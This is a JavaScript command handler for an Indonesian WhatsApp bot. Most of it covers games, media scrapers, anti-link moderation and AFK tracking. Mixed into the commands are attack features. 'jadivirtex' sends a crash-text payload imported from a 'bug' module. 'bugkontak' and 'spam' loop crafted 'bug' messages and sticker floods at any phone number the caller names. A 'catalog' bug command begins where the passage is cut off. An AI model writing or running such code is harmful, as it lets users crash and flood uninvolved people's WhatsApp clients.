/**
   * Base By Dika Ardnt.
   * Recode Manz Tzy
   * Wa Me https://wa.me/6281327496283
   * Nama session nya manztzy.json
*/

require('./setting')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const anime = require('./scrape/anime')
const path = require('path')
const jimp = require('jimp')
const { kusonime } = require('./scrape/kusonime')
const ms = require('ms')
const os = require('os')
const { igdl, wiki, mediafire, tiktok, herodetail, herolist, shoppe, otaku, film, covid, twitter, pinterest, igstory, igstalk, ytdl, fbdown, playstore, lirik, komiku, linkwa, wattpad
} = require('./lib/main')
const tt = require('./scrape/tiktok')
const { xnxxsearch, xnxxdl } = require('./lib/xnxx')
const { philip } = require('./bug/1.js')
const { tiktokdl, tiktokdlv2, youtubeSearch } = require('@bochilteam/scraper')
const { FajarNews, 
BBCNews, 
metroNews, 
CNNNews, 
iNews, 
KumparanNews, 
TribunNews, 
DailyNews, 
DetikNews, 
OkezoneNews, 
CNBCNews, 
KompasNews, 
SindoNews, 
TempoNews, 
IndozoneNews, 
AntaraNews, 
RepublikaNews, 
VivaNews, 
KontanNews, 
MerdekaNews, 
KomikuSearch, 
AniPlanetSearch, 
KomikFoxSearch, 
KomikStationSearch, 
MangakuSearch, 
KiryuuSearch, 
KissMangaSearch, 
KlikMangaSearch, 
PalingMurah, 
LayarKaca21, 
AminoApps, 
Mangatoon, 
WAModsSearch, 
Emojis, 
CoronaInfo, 
JalanTikusMeme, 
Cerpen, 
Quotes, 
Couples, 
Darkjokes } = require('dhn-api')
const hx = require('hxz-api')
const cal = require('caliph-api')
const { TiktokDownloader } = require('./lib/tiktokdl') 
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, getGroupAdmins } = require('./lib/myfunc')
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = alfa = async (alfa, m, chatUpdate, store) => {
try {
        ppuser = await alfa.profilePictureUrl(m.sender, 'image')
        } catch (err) {
        ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
        }
        ppnya = await reSize(ppuser, 200, 200)
	try {
		var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
		var budy = (typeof m.text == 'string' ? m.text : '')
		var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
		const isCmd = body.startsWith(prefix)
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		 const from = m.chat
		 const reply = m.reply
		const args = body.trim().split(/ +/).slice(1)
		const pushname = m.pushName || "No Name"
		const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
		const botNumber = await alfa.decodeJid(alfa.user.id)
		const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const itsMe = m.sender == botNumber ? true : false
		const text = q = args.join(" ")
		const quoted = m.quoted ? m.quoted : m
		const mime = (quoted.msg || quoted).mimetype || ''
		const isMedia = /image|video|sticker|audio/.test(mime)
		const isBan = ban.includes(m.sender)
const isPremier = prem.includes(m.sender)
const isUser = pendaftar.includes(m.sender)

		// Group
		const groupMetadata = m.isGroup ? await alfa.groupMetadata(m.chat).catch(e => {}) : ''
		const groupName = m.isGroup ? groupMetadata.subject : ''
		const participants = m.isGroup ? await groupMetadata.participants : ''
		const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
		const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
		const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
		const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	const sticWait = (jid) => {
			ano = fs.readFileSync('./Kir/JANGANDIUBAH/wait.webp')
			alfa.sendMessage(jid, { sticker: { url: ano } }, { quoted: ftroli })
			}
			
			const generateProfilePicture = async(buffer) => {
const jimp_1 = await jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, jimp.AUTO) : jimp_1.resize(jimp.AUTO, 650)
const jimp_2 = await jimp.read(await resz.getBufferAsync(jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(jimp.MIME_JPEG)
}
}

	
	const fakey = (teks) => {
            alfa.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `Join Banh 😅☝️`,"body": `Join Bot's Official GC`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./lib/test.jpg`),"sourceUrl": "https://chat.whatsapp.com/CX0d2T3r76FD3tOMBbjOSI"}}}, { quoted: m})
        }
        const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid, 
"thumbnail": img, 
"itemCount": itcount, 
"status": "INQUIRY", 
"surface": "CATALOG", 
"orderTitle": title, 
"message": text, 
"sellerJid": sellers, 
"token": tokens, 
"totalAmount1000": ammount, 
"totalCurrencyCode": "IDR", 
}
}), { userJid: jid })
alfa.relayMessage(jid, order.message, { messageId: order.key.id})
}

const katalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
                    "product": {
                        "productImage": fs.readFileSync(`./lib/test.jpg`),
                        "productId": "4457725420906655",
                        "title": `ALL MENU`,
                        "description": `menunyai`,
                        "footerText": `メLord Akira⁴̅⁰͍⁴̵`,
                        "currencyCode": "IDR",
                        "priceAmount1000": "100000000",
                        "productImageCount": 1,
                        "firstImageId": 1,
                        "salePriceAmount1000": "35000000",
                        "retailerId": `YouTube : alfa×`,
                        "url": "OWNER : https://wa.me/6287705048235\nYT : https://bit.ly/3BpBe1Z\nGROUP : https://bit.ly/3Ene2TO"
                    },
                    "businessOwnerJid": "6287705048235@s.whatsapp.net",
                }
}), { userJid: m })
const bug = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
        const ftrol = {key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`,
				   remoteJid: "6281903153426-1626053991@g.us"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 99999999,
				    status: 1,
				    surface: 1,
				    message: '',
				    orderTitle: '999999999', 
				    sellerJid: `0@s.whatsapp.net` 
				   }
				  }
				  }
        const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `© ${copy}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        const floc = {
        key : {
        participant : '0@s.whatsapp.net'
        },
        message: {
        locationMessage: {
        name: `I’m From Indonesia 🇮🇩`,
        jpegThumbnail:  `fs.readFileSync('./lib/thx.jpg')`
        }
        }
        }
      
	
	try {
			let isNumber = x => typeof x === 'number' && !isNaN(x)
			let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
			let user = global.db.data.users[m.sender]
			if (typeof user !== 'object') global.db.data.users[m.sender] = {}
			if (user) {
				if (!isNumber(user.afkTime)) user.afkTime = -1
				if (!('afkReason' in user)) user.afkReason = ''
				if (!isNumber(user.limit)) user.limit = limitUser
			} else global.db.data.users[m.sender] = {
				afkTime: -1,
				afkReason: '',
				limit: limitUser,
			}
	
			let chats = global.db.data.chats[m.chat]
			if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
			if (chats) {
				if (!('mute' in chats)) chats.mute = false
				if (!('antilink' in chats)) chats.antilink = false
			} else global.db.data.chats[m.chat] = {
				mute: false,
				antilink: false,
			}
		
		let setting = global.db.data.settings[botNumber]
			if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
		if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
		} else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		}
		
		} catch (err) {
			console.error(err)
		}
		
		//if (!m.key.fromMe) return false


 if (budy.length > 3500) {
  reply(`Somebody spammed virus!! Mark as read⚠️\n`.repeat(999))
  reply(`\`\`\`「 Virus Detected 」\`\`\`\n\nSorry You Will Be Kicked !`)
  if (!isBotAdmins) return reply(mess.botadmin)
  alfa.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
  }
		
		if (!alfa.self) {
			if (!m.key.fromMe) return
		}
		
		if (m.message) {
            alfa.readMessages([m.key])
            }

       if (from === 'status@broadcast') {
		alfa.chatRead(from)
	}
        
		 
		// Push Message To Console && Auto Read
		if (m.message) {
			console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
		}
		
		if (from) { alfa.sendPresenceUpdate('availabe', from) }
		
		if (isCmd && !isUser) {
			pendaftar.push(m.sender)
			fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
		  }
	
	// reset limit every 12 hours
		let cron = require('node-cron')
		cron.schedule('00 12 * * *', () => {
			let user = Object.keys(global.db.data.users)
			let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
			for (let jid of user) global.db.data.users[jid].limit = limitUser
			console.log('Reseted Limit')
		}, {
			scheduled: true,
			timezone: "Asia/Jakarta"
		})
		
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
		let setting = global.db.data.settings[botNumber]
		if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await alfa.setStatus(`${bot} | Telah Online Selama : ${uptime}`)
		setting.status = new Date() * 1
		}
	}
		
	  // Anti Link
		if (db.data.chats[m.chat].antilink) {
		if (budy.match(`chat.whatsapp.com`)) {
		m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
		if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
		let gclink = (`https://chat.whatsapp.com/`+await alfa.groupInviteCode(m.chat))
		let isLinkThisGc = new RegExp(gclink, 'i')
		let isgclink = isLinkThisGc.test(m.text)
		if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
		if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
		if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
		}
		}
		
	  // Mute Chat
	  if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
	  return
	  }

		// Respon Cmd with media
		if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
		let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
		let { text, mentionedJid } = hash
		let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
			userJid: alfa.user.id,
			quoted: m.quoted && m.quoted.fakeObj
		})
		messages.key.fromMe = areJidsSameUser(m.sender, alfa.user.id)
		messages.key.id = m.key.id
		messages.pushName = m.pushName
		if (m.isGroup) messages.participant = m.sender
		let msg = {
			...chatUpdate,
			messages: [proto.WebMessageInfo.fromObject(messages)],
			type: 'append'
		}
		alfa.ev.emit('messages.upsert', msg)
		}
		
		
		
	if (('family100'+m.chat in _family100) && isCmd) {
			kuis = true
			let room = _family100['family100'+m.chat]
			let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
			let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
			if (!isSurender) {
				let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
				if (room.terjawab[index]) return !0
				room.terjawab[index] = m.sender
			}
			let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
			let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
		return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
	}).filter(v => v).join('\n')}
	${isSurender ? '' : `Perfect Player`}`.trim()
			alfa.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
			if (isWin || isSurender) delete _family100['family100'+m.chat]
		}

		if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = tebaklagu[m.sender.split('@')[0]]
			if (budy.toLowerCase() == jawaban) {
				await alfa.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, alfa.user.name, m)
				delete tebaklagu[m.sender.split('@')[0]]
			} else m.reply('*Jawaban Salah!*')
		}

		if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = kuismath[m.sender.split('@')[0]]
			if (budy.toLowerCase() == jawaban) {
				await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
				delete kuismath[m.sender.split('@')[0]]
			} else m.reply('*Jawaban Salah!*')
		}

		if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = tebakgambar[m.sender.split('@')[0]]
			if (budy.toLowerCase() == jawaban) {
				await alfa.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, alfa.user.name, m)
				delete tebakgambar[m.sender.split('@')[0]]
			} else m.reply('*Jawaban Salah!*')
		}

		if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = tebakkata[m.sender.split('@')[0]]
			if (budy.toLowerCase() == jawaban) {
				await alfa.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, alfa.user.name, m)
				delete tebakkata[m.sender.split('@')[0]]
			} else m.reply('*Jawaban Salah!*')
		}

		if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = caklontong[m.sender.split('@')[0]]
		deskripsi = caklontong_desk[m.sender.split('@')[0]]
			if (budy.toLowerCase() == jawaban) {
				await alfa.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, alfa.user.name, m)
				delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
			} else m.reply('*Jawaban Salah!*')
		}

		if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = tebakkalimat[m.sender.split('@')[0]]
			if (budy.toLowerCase() == jawaban) {
				await alfa.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, alfa.user.name, m)
				delete tebakkalimat[m.sender.split('@')[0]]
			} else m.reply('*Jawaban Salah!*')
		}

		if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = tebaklirik[m.sender.split('@')[0]]
			if (budy.toLowerCase() == jawaban) {
				await alfa.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, alfa.user.name, m)
				delete tebaklirik[m.sender.split('@')[0]]
			} else m.reply('*Jawaban Salah!*')
		}
		
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = tebaktebakan[m.sender.split('@')[0]]
			if (budy.toLowerCase() == jawaban) {
				await alfa.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, alfa.user.name, m)
				delete tebaktebakan[m.sender.split('@')[0]]
			} else m.reply('*Jawaban Salah!*')
		}
		
		//TicTacToe
		this.game = this.game ? this.game : {}
		let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
		if (room) {
		let ok
		let isWin = !1
		let isTie = !1
		let isSurrender = !1
		// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
		if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
		isSurrender = !/^[1-9]$/.test(m.text)
		if (m.sender !== room.game.currentTurn) { // nek wayahku
		if (!isSurrender) return !0
		}
		if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
		m.reply({
		'-3': 'Game telah berakhir',
		'-2': 'Invalid',
		'-1': 'Posisi Invalid',
		0: 'Posisi Invalid',
		}[ok])
		return !0
		}
		if (m.sender === room.game.winner) isWin = true
		else if (room.game.board === 511) isTie = true
		let arr = room.game.render().map(v => {
		return {
		X: '❌',
		O: '⭕',
		1: '1️⃣',
		2: '2️⃣',
		3: '3️⃣',
		4: '4️⃣',
		5: '5️⃣',
		6: '6️⃣',
		7: '7️⃣',
		8: '8️⃣',
		9: '9️⃣',
		}[v]
		})
		if (isSurrender) {
		room.game._currentTurn = m.sender === room.game.playerX
		isWin = true
		}
		let winner = isSurrender ? room.game.currentTurn : room.game.winner
		let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
		if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
		room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
		if (room.x !== room.o) await alfa.sendText(room.x, str, m, { mentions: parseMention(str) } )
		await alfa.sendText(room.o, str, m, { mentions: parseMention(str) } )
		if (isTie || isWin) {
		delete this.game[room.id]
		}
		}

		//Suit PvP
		this.suit = this.suit ? this.suit : {}
		let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
		if (roof) {
		let win = ''
		let tie = false
		if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
		if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
		alfa.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
		delete this.suit[roof.id]
		return !0
		}
		roof.status = 'play'
		roof.asal = m.chat
		clearTimeout(roof.waktu)
		//delete roof[roof.id].waktu
		alfa.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
		if (!roof.pilih) alfa.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
		if (!roof.pilih2) alfa.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
		roof.waktu_milih = setTimeout(() => {
		if (!roof.pilih && !roof.pilih2) alfa.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
		else if (!roof.pilih || !roof.pilih2) {
		win = !roof.pilih ? roof.p2 : roof.p
		alfa.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
		}
		delete this.suit[roof.id]
		return !0
		}, roof.timeout)
		}
		let jwb = m.sender == roof.p
		let jwb2 = m.sender == roof.p2
		let g = /gunting/i
		let b = /batu/i
		let k = /kertas/i
		let reg = /^(gunting|batu|kertas)/i
		if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
		roof.pilih = reg.exec(m.text.toLowerCase())[0]
		roof.text = m.text
		m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
		if (!roof.pilih2) alfa.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
		}
		if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
		roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
		roof.text2 = m.text
		m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
		if (!roof.pilih) alfa.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
		}
		let stage = roof.pilih
		let stage2 = roof.pilih2
		if (roof.pilih && roof.pilih2) {
		clearTimeout(roof.waktu_milih)
		if (b.test(stage) && g.test(stage2)) win = roof.p
		else if (b.test(stage) && k.test(stage2)) win = roof.p2
		else if (g.test(stage) && k.test(stage2)) win = roof.p
		else if (g.test(stage) && b.test(stage2)) win = roof.p2
		else if (k.test(stage) && b.test(stage2)) win = roof.p
		else if (k.test(stage) && g.test(stage2)) win = roof.p2
		else if (stage == stage2) tie = true
		alfa.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
		delete this.suit[roof.id]
		}
		}
		
		let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		for (let jid of mentionUser) {
			let user = global.db.data.users[jid]
			if (!user) continue
			let afkTime = user.afkTime
			if (!afkTime || afkTime < 0) continue
			let reason = user.afkReason || ''
			m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
		}

		if (db.data.users[m.sender].afkTime > -1) {
			let user = global.db.data.users[m.sender]
			m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
			user.afkTime = -1
			user.afkReason = ''
		}
		
		switch(command) {
		case 'rangkum': {
		let js = await cal.other.rangkum(q).catch(e => {
		reply('eror')
		})
		console.log(js)
		reply(js)
		}
		break
		case 'sfile': {
		let ok = await cal.search.sfile(q).catch(e => {
		reply('eror')
		})
		console.log(ok)
		let ha = ok.result
		let teks = `SFILE SEARCH\n\n`
		for (let x of ha) {
		teks += `Nama: ${x.filename}\n`
		teks += `Link: ${x.url}\n________________________\n`
		}
		reply(teks)
		}
		break
		case 'translate': {
		let ha = await cal.other.translate(q).catch(e => {
		reply('eror')
		})
		console.log(ha)
		let teks = `Hasil Translate Dari ${q}\n\nTranslate Dari Kode Negara: ${ha.result.fromlang}\nTranslate: ${ha.result.text}`
		alfa.sendMessage(from, { text: teks }, m)
		}
		break
		case 'anime': {
		const json = await anime.anime(q).catch(e => {
		reply('eror')
		})
		console.log(json)
		const rndm =  json[Math.floor(Math.random() * (json.length))]
		alfa.sendMessage(from, { image: { url: rndm.thumbnail }, caption: `Judul: ${json.judul}\nLink: ${json.link}`}, { quoted: m })
		}
		break
		case 'jadivirtex': {
if (!q) return reply(`Contoh: ${command} Ushio`)
let quotednya = await alfa.sendText(m.chat, `${q} ${philip}`)
alfa.sendText(m.chat, `Virtex Nya Itu Bang`, quotednya)
}
break
		case 'f': {
	    alfa.sendMessage(m.chat, {text: "Affah"}, {quoted: ftrol})
	    }
	    break
case 'k': {
	    alfa.sendMessage(m.chat, {text: "Affah"}, {quoted: ftrol})
	    }
	    break
		case 'afk': {
				let user = global.db.data.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
			}
			break	
case 'gitclone': {
if (!q) return m.reply(`Contoh: ${command} ManzTzy/AkariBot`)
m.reply('```Tunggu Sebentar ❗```')
var user = text.split('/')[0] ? text.split('/')[0] : '-'
 var repo = text.split('/')[1] ? text.split('/')[1] : '-'
let git = await getBuffer(`https://api.github.com/repos/${user}/${repo}/zipball`)
alfa.sendMessage(from, {document: git, mimetype: 'application/zip', fileName: `${user}/${repo}`}, { quoted : m }).catch((err) => reply(`Fitur ${command} Eror Atau Repo ${user}/${repo} Tidak Di Temukan`))
}
break
case 'oy': {
man = `apwa bwanh`
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: `https://wa.me/${global.own}?text=Assalamualaikum+bang`
								}
							}]
							alfa.send5ButMsg(m.chat, man, global.copy, btn)
							}
							break
case prefix+'bugkontak':{
if (args.length == 0) return reply(`Penggunaan ${command} nomor|jumlah|timer\nContoh ${command} 628×××|5|5s`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
alfa.sendContact(num, owner, bug)
await sleep(ms(waktu))
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case prefix+'spam':{
if (args.length == 0) return m.reply(`Penggunaan ${command} jumlah\nContoh ${command} 62xxx|5|10s`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
alfa.sendMessage(num, {sticker: ppnya},{ quoted: bug })
await sleep(ms(waktu))
}
m.reply(`Sukses Send Bug Ke ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case prefix+'catalog': { // Nemu di Sc chika
if (!isCreator) return m.reply(mess.owner)
if (!q) throw (`Penggunaan Catalog <628xxx|jumlah|waktu>`)
 var number = text.split('|')[0] ? text.split('|')[0] : '-'
 var jumlah = text.split('|')[1] ? text.split('|')[1] : '-'
